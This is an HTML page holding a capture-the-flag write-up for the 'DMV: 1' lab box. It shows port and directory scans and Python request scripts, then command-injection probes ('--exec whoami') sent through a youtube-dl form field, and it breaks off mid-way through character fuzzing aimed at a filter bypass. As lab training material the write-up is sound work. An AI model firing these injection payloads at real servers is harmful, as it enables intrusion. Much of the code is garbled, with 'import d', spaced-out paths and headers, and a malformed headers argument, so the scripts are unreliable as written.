@@ -1,0 +1,439 @@
+<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="DMV:1 - WRITE-UP" /><meta property="og:locale" content="en" /><meta name="description" content="MAIN INFORMATION ABOUT THE BOX BOX NAME: DMV: 1 Description: ``` It is a simple machine that replicates a real scenario that I found." /><meta property="og:description" content="MAIN INFORMATION ABOUT THE BOX BOX NAME: DMV: 1 Description: ``` It is a simple machine that replicates a real scenario that I found." /><link rel="canonical" href="https://cloufish.github.io/blog/posts/dmv1-en/" /><meta property="og:url" content="https://cloufish.github.io/blog/posts/dmv1-en/" /><meta property="og:site_name" content="Cloufish’s Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-06-03T07:46:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="DMV:1 - WRITE-UP" /><meta name="twitter:site" content="@Cloufisz" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"MAIN INFORMATION ABOUT THE BOX BOX NAME: DMV: 1 Description: ``` It is a simple machine that replicates a real scenario that I found.","url":"https://cloufish.github.io/blog/posts/dmv1-en/","@type":"BlogPosting","headline":"DMV:1 - WRITE-UP","dateModified":"2021-06-11T19:18:37+02:00","datePublished":"2020-06-03T07:46:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://cloufish.github.io/blog/posts/dmv1-en/"},"@context":"https://schema.org"}</script><title>DMV:1 - WRITE-UP | Cloufish's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/blog/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Cloufish's Blog"><meta name="application-name" content="Cloufish's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/blog/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/blog/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/blog/assets/js/dist/post.min.js"></script> <script defer src="/blog/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/blog/" alt="avatar" class="mx-auto"> <img src="/blog/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/blog/">Cloufish's Blog</a></div><div class="site-subtitle font-italic">My own internet corner :)</div></div><ul class="w-100"><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blog/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/blog/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/blog/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/blog/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/blog/resources/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>RESOURCES TO LEARN HACKING</span> </a><li class="nav-item"> <a href="/blog/contribute/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>HELP ME WITH GITHUB PROJECTS</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Cloufish" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/Cloufisz" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['cloufisz','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/blog/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/blog/"> Posts </a> </span> <span>DMV:1 - WRITE-UP</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>DMV:1 - WRITE-UP</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Bartholomew Mokrzycki </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Jun 3, 2020, 7:46 AM +0200" prep="on" > Jun 3, 2020 <i class="unloaded">2020-06-03T07:46:00+02:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Jun 11, 2021, 7:18 PM +0200" prefix="Updated " > Jun 11 <i class="unloaded">2021-06-11T19:18:37+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3161 words">17 min</span></div></div><div class="post-content"><h2 id="main-information-about-the-box">MAIN INFORMATION ABOUT THE BOX</h2><h3 id="box-name-dmv-1">BOX NAME: DMV: 1</h3><h3 id="description">Description:</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>It is a simple machine that replicates a real scenario that I found.
+
+The goal is to get two flags, one that is in the secret folder and the other that can only be read by the root user
+
+
+This works better with VirtualBox rather than VMware.
+</pre></table></code></div></div><h2 id="recon">RECON</h2><h3 id="nmap">NMAP</h3><p>Let’s start by running Nmap on the Box:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-T4</span> <span class="nt">-p-</span> <span class="nt">-A</span> 192.168.56.111
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre>Starting Nmap 7.80 (https://nmap.org) at 2020-06-02 13:19 EDT
+Nmap scan report for 192.168.56.111
+Host is up (0.00021s latency).
+Not shown: 65533 closed ports
+PORT STATE SERVICE VERSION
+22 / tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+| 2048 65: 1b: fc: 74: 10: 39: df: dd: d0: 2d: f0: 53: 1c: eb: 6d: ec (RSA)
+| 256 c4: 28: 04: a5: c3: b9: 6a: 95: 5a: 4d: 7a: 6e: 46: e2: 14: db (ECDSA)
+| _ 256 ba: 07: bb: cd: 42: 4a: f2: 93: d1: 05: d0: b3: 4c: b1: d9: b1 (ED25519)
+80 / tcp open http Apache httpd 2.4.29 ((Ubuntu))
+| _http-server-header: Apache / 2.4.29 (Ubuntu)
+| _http-title: Site doesn't have a title (text / html; charset = UTF-8).
+Service Info: OS: Linux; CPE: cpe: / o: linux: linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
+Nmap done: 1 IP address (1 host up) scanned in 9.18 seconds
+</pre></table></code></div></div><p>We can see that the Box has an open HTTP port when entering the website, we see the Youtube logo with a simple Input.</p><h3 id="gobuster">GOBUSTER</h3><p>I run the gobuster tool to brute-force page directories.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">--url</span> http://192.168.56.111 <span class="nt">--wordlist</span> /usr/share/wordlists/dirb/common.txt
+<span class="o">==================================================</span> <span class="o">=============</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">==================================================</span> <span class="o">=============</span>
+<span class="o">[</span>+] Url: http://192.168.56.111
+<span class="o">[</span>+] Threads: 10
+<span class="o">[</span>+] Wordlist: /usr/share/wordlists/dirb/common.txt
+<span class="o">[</span>+] Status codes: 200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent: gobuster / 3.0.1
+<span class="o">[</span>+] Timeout: 10s
+<span class="o">==================================================</span> <span class="o">=============</span>
+2020/06/02 13:21:52 Starting gobuster
+<span class="o">==================================================</span> <span class="o">=============</span>
+/.hta <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
+/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
+/ admin <span class="o">(</span>Status: 401<span class="o">)</span>
+/ images <span class="o">(</span>Status: 301<span class="o">)</span>
+/index.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/ js <span class="o">(</span>Status: 301<span class="o">)</span>
+/ server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+/ tmp <span class="o">(</span>Status: 301<span class="o">)</span>
+<span class="o">==================================================</span> <span class="o">=============</span>
+2020/06/02 13:21:52 Finished
+<span class="o">==================================================</span> <span class="o">=============</span>
+</pre></table></code></div></div><p>From the above, I can see that only the home page is reachable by the client. We have nothing left but to play with this Input !.</p><h3 id="discovering-application-behavior">DISCOVERING APPLICATION BEHAVIOR</h3><p>We will use the “requests” python module for this. Why, because using Python for this purpose gives you much more freedom than the Community Burp Suite version. Also because just scripting such things is always a good lesson: P</p><p>So I created a simple script that will allow us to play with input</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre><td class="rouge-code"><pre><span class="c1">#! / usr / bin / python
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">d</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">'http://192.168.56.111'</span>
+
+
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span> <span class="p">(</span>
+<span class="n">url</span><span class="p">,</span>
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"yt_url"</span><span class="p">:</span> <span class="s">'&gt;'</span><span class="p">},</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+<span class="s">'Host'</span><span class="p">:</span> <span class="s">'192.168.56.111'</span><span class="p">,</span>
+<span class="s">'User-Agent'</span><span class="p">:</span> <span class="s">'Mozilla / 5.0 (X11; Linux x86_64; rv: 76.0) Gecko / 20100101 Firefox / 76.0'</span><span class="p">,</span>
+<span class="s">'Accept'</span><span class="p">:</span> <span class="s">'* / *'</span><span class="p">,</span>
+<span class="s">'Accept-Language'</span><span class="p">:</span> <span class="s">'en-US, en; q = 0.5'</span><span class="p">,</span>
+<span class="s">'Accept-Encoding'</span><span class="p">:</span> <span class="s">'gzip, deflate'</span><span class="p">,</span>
+<span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application / x-www-form-urlencoded; charset = UTF-8 '</span><span class="p">,</span>
+<span class="s">'X-Requested-With'</span><span class="p">:</span> <span class="s">'XMLHttpRequest'</span><span class="p">,</span>
+<span class="s">'Content-Length'</span><span class="p">:</span> <span class="s">'66'</span><span class="p">,</span>
+<span class="s">'Origin'</span><span class="p">:</span> <span class="s">'http://192.168.56.111'</span><span class="p">,</span>
+<span class="s">'Connection'</span><span class="p">:</span> <span class="s">'close'</span><span class="p">,</span>
+<span class="s">'Referer'</span><span class="p">:</span> <span class="s">'http://192.168.56.111/index.php'</span><span class="p">,</span>
+<span class="p">}</span>
+
+
+<span class="p">)</span>
+
+<span class="k">print</span> <span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">cookies</span><span class="p">)</span>
+<span class="k">print</span> <span class="p">(</span><span class="s">"==========="</span><span class="p">)</span>
+<span class="k">print</span> <span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+<span class="k">print</span> <span class="p">(</span><span class="s">"==========="</span><span class="p">)</span>
+<span class="k">print</span> <span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">headers</span><span class="p">)</span>
+</pre></table></code></div></div><p>Our string is present in the “data” variable. By doing it, we will get:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>python DMV: 1_script.py
+&lt;RequestsCookieJar <span class="o">[]&gt;</span>
+<span class="o">===========</span>
+<span class="o">{</span><span class="s2">"status"</span>: 1, <span class="s2">"errors"</span>: <span class="s2">"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this. </span><span class="se">\ </span><span class="s2">nERROR: u'testtestestest 'is not a valid URL . Set --default-search </span><span class="se">\ </span><span class="s2">"</span>ytsearch <span class="se">\"</span> <span class="o">(</span>or run youtube-dl <span class="se">\ </span><span class="s2">"ytsearch: testtestestest </span><span class="se">\"</span><span class="s2">) to search YouTube </span><span class="se">\ </span><span class="s2">n "</span>,<span class="s2">" url_orginal "</span>:<span class="s2">" testtestestest "</span>,<span class="s2">" output "</span>:<span class="s2">" "</span>,<span class="s2">" result_url "</span>:<span class="s2">" </span><span class="se">\ </span><span class="s2">/ tmp </span><span class="se">\ </span><span class="s2">/ downloads </span><span class="se">\ </span><span class="s2">/5ed68be90d2e9.mp3 "</span><span class="o">}</span>
+<span class="o">===========</span>
+<span class="o">{</span><span class="s1">'Content-Length'</span>: <span class="s1">'297'</span>, <span class="s1">'Content-Encoding'</span>: <span class="s1">'gzip'</span>, <span class="s1">'Vary'</span>: <span class="s1">'Accept-Encoding'</span>, <span class="s1">'Server'</span>: <span class="s1">'Apache / 2.4.29 (Ubuntu)'</span>, <span class="s1">'Connection'</span>: <span class="s1">'close'</span>, <span class="s1">'Date'</span>: <span class="s1">'Tue, 02 Jun 2020 17:27:05 GMT'</span>, <span class="s1">'Content-Type'</span>: <span class="s1">'text / html; charset = UTF-8 '</span><span class="o">}</span>
+</pre></table></code></div></div><p>We get an error. Mhmm, interesting. Maybe this error is specifically related to some software the server uses? By typing in Google, we get …</p><p>Lots of issues from Github :P. The first is about youtube-dl. When you see the README of the repository, you may notice a very dangerous software flag.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>--exec CMD Execute a command on the file after
+                                 downloading and post-processing, similar to
+                                 find's -exec syntax. Example: --exec 'adb
+                                 push {} / sdcard / Music / &amp;&amp; rm {} '
+</pre></table></code></div></div><p>I enter the command with this flag in the “date” field.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>'yt_url': '- exec whoami'
+</pre></table></code></div></div><p>The error, however, still exists the same. Maybe the problem is caused by strange command parsing? I deleted the spaces.</p><p><code class="language-plaintext highlighter-rouge">'--execwhoami'</code></p><p>Output surprises. For we see:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>
+{"status": 2, "errors": "Usage: youtube-dl [OPTIONS] URL [URL ...] \ n \ nyoutube-dl: error: no such option: --execwhoami \ n", "url_orginal" : "- execwhoami", "output": "", "result_url": "\ / tmp \ / downloads \ /5ed69849b1a6d.mp3"}
+
+
+</pre></table></code></div></div><p>Now at least we know it’s about spaces. Now the question is how to put it in UTF-8 format? The space value in UTF-8 is either “+” or “% 20”. There is even a special bash variable $ {IFS} that replaces spaces. Unfortunately, neither of these options works. Or am I wrong? Maybe it works, <strong>except that something else is stopping the command from executing?</strong> Often WAFs filter out special characters. Let’s see if it’s not about signs.</p><h2 id="fuzzing--waf-bypass">Fuzzing / WAF BYPASS</h2><p>We will edit the script to sequentially brute-force the special characters.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre><td class="rouge-code"><pre>
+<span class="c1">#! / usr / bin / python
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">d</span>
+<span class="kn">import</span> <span class="nn">string</span>
+
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">'http://192.168.56.111'</span>
+<span class="n">special_chars</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span>
+<span class="k">print</span> <span class="p">(</span><span class="n">special_chars</span><span class="p">)</span>
+<span class="n">filtered_chars</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">special_chars</span><span class="p">:</span>
+<span class="k">print</span> <span class="p">(</span><span class="s">'TRYING:'</span> <span class="o">+</span> <span class="n">ch</span> <span class="o">+</span> <span class="s">'===================================== \ n'</span> <span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span> <span class="p">(</span>
+<span class="n">url</span><span class="p">,</span>
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'yt_url'</span><span class="p">:</span> <span class="s">''</span><span class="p">.</span> <span class="n">join</span> <span class="p">(</span><span class="n">ch</span><span class="p">)},</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+<span class="n">headers</span>
+<span class="p">}</span>
+<span class="p">)</span>
+<span class="k">if</span> <span class="n">r</span><span class="p">:</span>
+<span class="n">filtered_chars</span><span class="p">.</span><span class="n">append</span> <span class="p">(</span><span class="n">ch</span><span class="p">)</span>
+<span class="k">print</span> <span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+<span class="k">break</span>
+
+<span class="k">print</span> <span class="p">(</span><span class="n">filtered_chars</span><span class="p">)</span>
+</pre></table></code></div></div><p>The script checks each character in turn. Characters that after sending gave the HTTP status positive are added to the list (These are all special characters) Now, then, it’s time to analyze the server’s response</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre><span class="err">$</span> <span class="n">python3</span> <span class="n">DMV</span><span class="p">:</span> <span class="mi">1</span><span class="n">_script</span><span class="p">.</span><span class="n">py</span>
+<span class="err">!</span> <span class="s">"# $% &amp; '() * +, -. / :; &lt;=&gt;? @ [\] ^ _` {|} ~
+TRYING:! =====================================
+
+{"</span><span class="n">status</span><span class="s">": 1, "</span><span class="n">errors</span><span class="s">": "</span><span class="n">WARNING</span><span class="p">:</span> <span class="n">Assuming</span> <span class="o">--</span><span class="n">restrict</span><span class="o">-</span><span class="n">filenames</span> <span class="n">since</span> <span class="nb">file</span> <span class="n">system</span> <span class="n">encoding</span> <span class="n">cannot</span> <span class="n">encode</span> <span class="nb">all</span> <span class="n">characters</span><span class="p">.</span> <span class="n">Set</span> <span class="n">the</span> <span class="n">LC_ALL</span> <span class="n">environment</span> <span class="n">variable</span> <span class="n">to</span> <span class="n">fix</span> <span class="n">this</span><span class="p">.</span> \ <span class="n">nERROR</span><span class="p">:</span> <span class="n">u</span> <span class="s">'!'</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">a</span> <span class="n">valid</span> <span class="n">URL</span><span class="p">.</span> <span class="n">Set</span> <span class="o">--</span><span class="n">default</span><span class="o">-</span><span class="n">search</span> \ <span class="s">"ytsearch </span><span class="se">\"</span><span class="s"> (or run youtube-dl \ "</span><span class="n">ytsearch</span><span class="p">:</span><span class="err">!</span> \<span class="s">") to search YouTube \ n "</span><span class="p">,</span><span class="s">" url_orginal "</span><span class="p">:</span><span class="s">"! "</span><span class="p">,</span><span class="s">" output "</span><span class="p">:</span> <span class="s">""</span><span class="p">,</span> <span class="s">"result_url"</span><span class="p">:</span> <span class="s">"\ / tmp \ / downloads \ /5ed76bb2584f1.mp3"</span><span class="p">}</span>
+<span class="n">TRYING</span><span class="p">:</span> <span class="s">"=====================================
+
+{"</span><span class="n">status</span><span class="s">": 2, "</span><span class="n">errors</span><span class="s">": "</span><span class="n">sh</span><span class="p">:</span> <span class="mi">1</span><span class="p">:</span> <span class="n">Syntax</span> <span class="n">error</span><span class="p">:</span> <span class="n">Unterminated</span> <span class="n">quoted</span> <span class="n">string</span> \ <span class="n">n</span><span class="s">", "</span><span class="n">url_orginal</span><span class="s">": "</span>\<span class="s">" "</span><span class="p">,</span><span class="s">" output "</span><span class="p">:</span><span class="s">" "</span><span class="p">,</span><span class="s">" result_url "</span><span class="p">:</span><span class="s">" \ / tmp \ / downloads \ /5ed76bb388791.mp3 "</span><span class="p">}</span>
+<span class="n">TRYING</span><span class="p">:</span> <span class="c1"># =====================================
+</span>
+<span class="p">{</span><span class="s">"status"</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="s">"errors"</span><span class="p">:</span> <span class="s">"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this. \ nUsage: youtube-dl [OPTIONS] URL [URL ...] \ n \ nyoutube-dl: error: You must provide at least one URL. \ nType youtube-dl --help to see a list of all options. \ n "</span><span class="p">,</span><span class="s">" url_orginal "</span><span class="p">:</span><span class="s">" # "</span><span class="p">,</span><span class="s">" output "</span><span class="p">:</span><span class="s">" "</span><span class="p">,</span><span class="s">" result_url "</span><span class="p">:</span><span class="s">" \ / tmp \ / downloads \ /5ed76bb3898a2.mp3 "</span><span class="p">}</span>
+<span class="n">TRYING</span><span class="p">:</span> <span class="err">$</span> <span class="o">=====================================</span>
+
+<span class="p">{</span><span class="s">"status"</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s">"errors"</span><span class="p">:</span> <span class="s">"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this. \ nERROR: u '$' is not a valid URL Set --default-search \ "</span><span class="n">ytsearch</span> \<span class="s">" (or run youtube-dl \ "</span><span class="n">ytsearch</span><span class="p">:</span> <span class="err">$</span> \<span class="s">") to search YouTube \ n "</span><span class="p">,</span><span class="s">" url_orginal "</span><span class="p">:</span><span class="s">" $ "</span><span class="p">,</span><span class="s">" output "</span><span class="p">:</span><span class="s">" "</span><span class="p">,</span><span class="s">" result_url "</span><span class="p">:</span><span class="s">" \ / tmp \ / downloads \ /5ed76bb44a615.mp3 "</span><span class="p">}</span>
+<span class="n">TRYING</span><span class="p">:</span><span class="o">%</span> <span class="o">=====================================</span>
+
+<span class="p">{</span><span class="s">"status"</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s">"errors"</span><span class="p">:</span> <span class="s">"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this. \ nERROR: u '%' is not a valid URL Set --default-search \ "</span><span class="n">ytsearch</span> \<span class="s">" (or run youtube-dl \ "</span><span class="n">ytsearch</span><span class="p">:</span><span class="o">%</span> \<span class="s">") to search YouTube \ n "</span><span class="p">,</span><span class="s">" url_orginal "</span><span class="p">:</span><span class="s">"% "</span><span class="p">,</span><span class="s">" output "</span><span class="p">:</span><span class="s">" "</span><span class="p">,</span><span class="s">" result_url "</span><span class="p">:</span><span class="s">" \ / tmp \ / downloads \ /5ed76bb586577.mp3 "</span><span class="p">}</span>
+
+<span class="p">[</span><span class="s">'!'</span><span class="p">,</span> <span class="s">'"'</span><span class="p">,</span> <span class="s">'#'</span><span class="p">,</span> <span class="s">'$'</span><span class="p">,</span> <span class="s">'%'</span><span class="p">,</span> <span class="s">'&amp;'</span><span class="p">,</span><span class="s">" '"</span><span class="p">,</span><span class="s">' ('</span><span class="p">,</span><span class="s">') '</span><span class="p">,</span><span class="s">' * '</span><span class="p">,</span><span class="s">' + '</span><span class="p">,</span><span class="s">', '</span><span class="p">,</span><span class="s">' - '</span><span class="p">,</span><span class="s">'. '</span><span class="p">,</span><span class="s">' / '</span><span class="p">,</span><span class="s">': '</span><span class="p">,</span><span class="s">'; '</span><span class="p">,</span><span class="s">' &lt;'</span><span class="p">,</span><span class="s">' = '</span><span class="p">,</span><span class="s">'&gt; '</span><span class="p">,</span><span class="s">'? '</span><span class="p">,</span><span class="s">' @ '</span><span class="p">,</span><span class="s">' ['</span><span class="p">,</span><span class="s">' </span><span class="se">\\</span><span class="s"> '</span><span class="p">,</span><span class="s">'] '</span><span class="p">,</span><span class="s">' ^ '</span><span class="p">,</span><span class="s">' _ '</span><span class="p">,</span><span class="s">' `'</span><span class="p">,</span><span class="s">' {'</span><span class="p">,</span><span class="s">' | '</span><span class="p">,</span><span class="s">'} '</span><span class="p">,</span><span class="s">' ~ '</span><span class="p">]</span>
+</pre></table></code></div></div><p>I allowed myself to shorten the output. We see an amazing thing. With many characters, the server response evaluates to bash <code class="language-plaintext highlighter-rouge">"errors": sh: 1</code>. Let’s change the condition so that it also takes into account the response content from the server <code class="language-plaintext highlighter-rouge">if "sh: 1" in r.text:</code></p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+</pre><td class="rouge-code"><pre><span class="n">python3</span> <span class="n">DMV</span><span class="p">:</span> <span class="mi">1</span><span class="n">_script</span><span class="p">.</span><span class="n">py</span>
+<span class="err">!</span> <span class="s">"# $% &amp; '() * +, -. / :; &lt;=&gt;? @ [\] ^ _` {|} ~
+
+
+TRYING: "</span><span class="o">=====================================</span>
+
